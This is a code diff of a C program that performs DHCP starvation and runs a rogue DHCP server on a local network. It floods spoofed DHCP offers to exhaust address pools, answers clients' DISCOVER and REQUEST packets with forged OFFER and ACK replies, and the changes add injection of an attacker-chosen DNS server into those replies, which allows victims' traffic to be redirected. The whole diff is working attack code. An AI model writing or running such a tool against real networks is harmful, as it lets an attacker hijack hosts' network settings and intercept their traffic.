@@ -1,7 +1,8 @@
-#include<pcap.h>
-#include<stdio.h>
-#include<stdlib.h>
-#include<string.h>
+#include <pcap.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 #include <pthread.h>
 
 #include<sys/socket.h>
@@ -11,13 +12,17 @@
 
 #define BUF_SIZE 65536
 
+#define MY_DNS_SERVER "1.2.3.4"
+
 struct list_ip ips;
 int sockfd;
+
+dhcp_header *offer;
 
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer);
 
 
-void *listen_dhcp(){
+void listen_dhcp(){
 	
 
 	pcap_t *handle;
@@ -81,11 +86,11 @@ void *listen_dhcp(){
 	char const filter_exp[] = "udp and port 67 or 68";
 	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
 		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
-		return NULL;
+		return;
 	}
 	if (pcap_setfilter(handle, &fp) == -1) {
 		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
-		return NULL;
+		return;
 	}
 
 
@@ -97,44 +102,55 @@ void *listen_dhcp(){
 
 	pcap_close(handle);
 
-	return NULL;
+	return;
 }
 
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer){
 	int size = header->len;
 	struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
 
-	dhcp_header dhcph;
-	unsigned int packet_size = fill_dhcp_packet(&dhcph, buffer , size);
+	dhcp_header *dhcph;
+	unsigned int packet_size = fill_dhcp_packet(&dhcph, buffer, size);
 
-	int type = packet_type(&dhcph, packet_size);
+	int type = packet_type(dhcph, packet_size);
 	switch(type){
 		case DHCPDISCOVER:
 			//filter packets we are sending 
-			if(dhcph.xid != ntohl(10)){
+			
+			//if(dhcph.xid != ntohl(10)){
 				if(ips.len == 0){
 					printf("No ip address recovered from poisonning !\n");
 					return;
 				}
-				modify_packet_type(&dhcph, packet_size, DHCPOFFER);
-				dhcph.yiaddr = ips.ips[ips.index];
-				send_packet(sockfd, &dhcph, packet_size, ips.ips[ips.index++]);
-			}
+				modify_packet_type(dhcph, packet_size, DHCPOFFER);
+				dhcph->yiaddr = ips.ips[ips.index];
+				add_dns_server(dhcph, packet_size);
+				send_packet(sockfd, dhcph, packet_size, ips.ips[ips.index++]);
+		//	}
 			break;
 		case DHCPOFFER:
-			add_ip(&ips, dhcph.yiaddr);
+			add_ip(&ips, dhcph->yiaddr);
 			break;
 		case DHCPREQUEST:
-			modify_packet_type(&dhcph, packet_size, DHCPACK);
-			dhcph.yiaddr = dhcph.ciaddr;
-			dhcph.ciaddr = 0;
-			send_packet(sockfd, &dhcph, packet_size, ips.ips[ips.index++]);
+			modify_packet_type(dhcph, packet_size, DHCPACK);
+			dhcph->yiaddr = dhcph->ciaddr;
+			dhcph->ciaddr = 0;
+			add_dns_server(dhcph, packet_size);
+			send_packet(sockfd, dhcph, packet_size, ips.ips[ips.index++]);
 
 			break;
 		case DHCPACK:
 			break;
 		default:
 			break;
+	}
+}
+
+void *poison(){
+	while(1){
+		randomize_offer(offer);
+		send_packet_poison(sockfd, offer);
+		sleep(1);
 	}
 }
 
@@ -146,21 +162,18 @@ int main(){
 
 	sockfd = open_socket();
 
-	dhcp_header *offer = (dhcp_header*) malloc(sizeof(dhcp_header));
+	offer = (dhcp_header*) malloc(sizeof(dhcp_header));
 
 	fill_offer(offer);
 	
 	pthread_t thread;
 
-	if(pthread_create(&thread, NULL, listen_dhcp, NULL)){
+	if(pthread_create(&thread, NULL, poison, NULL)){
 		printf("Error creating thread\n");
 		return 1;
 	}
 
-	while(1){
-		randomize_offer(offer);
-		send_packet_poison(sockfd, offer);
-	}
+	listen_dhcp();
 	
 	free(offer);
 
